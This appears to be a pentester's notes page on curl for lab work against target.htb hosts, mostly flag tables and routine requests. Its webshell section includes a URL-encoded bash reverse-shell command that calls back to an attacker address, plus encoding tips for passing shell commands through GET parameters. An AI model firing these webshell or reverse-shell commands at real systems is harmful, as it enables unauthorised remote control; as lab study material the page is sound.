---
type: tool
category: web
tags: [web, http, curl, requests]
---

## What it is
curl is a command-line HTTP client (and much more). In pentest, it's your go-to for crafting and sending raw HTTP requests, testing endpoints, and scripting interactions without a browser.

## Core flags

| Flag | Meaning |
|------|---------|
| `-v` | Verbose — show full request and response headers |
| `-s` | Silent — suppress progress bar |
| `-k` | Skip SSL certificate verification |
| `-L` | Follow redirects |
| `-o <file>` | Save response body to file |
| `-O` | Save response body using remote filename |
| `-X <method>` | HTTP method (GET, POST, PUT, DELETE…) |
| `-d <data>` | POST body data |
| `-H 'Header: value'` | Add/override a header |
| `-b 'cookie=value'` | Send cookies |
| `-c <file>` | Save received cookies to file (cookie jar) |
| `-u user:pass` | Basic auth |
| `-A <agent>` | Set User-Agent |
| `--proxy http://127.0.0.1:8080` | Route through Burp proxy |
| `-I` | HEAD request — fetch headers only |
| `--data-urlencode` | URL-encode a POST field |

## Common patterns

**Basic GET:**
```bash
curl http://target.htb/
curl -s http://target.htb/ | grep -i "version\|admin\|email"
```

**Verbose (see full request + response):**
```bash
curl -v http://target.htb/
```

**POST with JSON body:**
```bash
curl -X POST http://target.htb/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}'
```

**POST form data:**
```bash
curl -X POST http://target.htb/login \
  -d 'username=admin&password=admin'
```

**Send through Burp (for intercepting/modifying):**
```bash
curl -k --proxy http://127.0.0.1:8080 https://target.htb/api/
```

**Skip SSL cert check (self-signed cert on lab):**
```bash
curl -k https://target.htb/
```

**Trigger RCE via webshell:**
```bash
curl "http://target.htb/uploads/shell.php?cmd=id"
curl "http://target.htb/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.x/4444+0>%261'"
```

**Download file:**
```bash
curl -s -O http://target.htb/backup.zip
```

## URL encoding note
When sending shell commands via a GET parameter, always URL-encode special characters:

| Char | Encoded |
|------|---------|
| Space | `+` or `%20` |
| `&` | `%26` |
| `>` | `%3E` |
| `<` | `%3C` |
| `'` | `%27` |
| `;` | `%3B` |

## Related
- [[HTTP]]
- [[HTTP Requests and Responses]]
- [[Pentest Web Cheatsheet]]
- [[Burp Suite]]
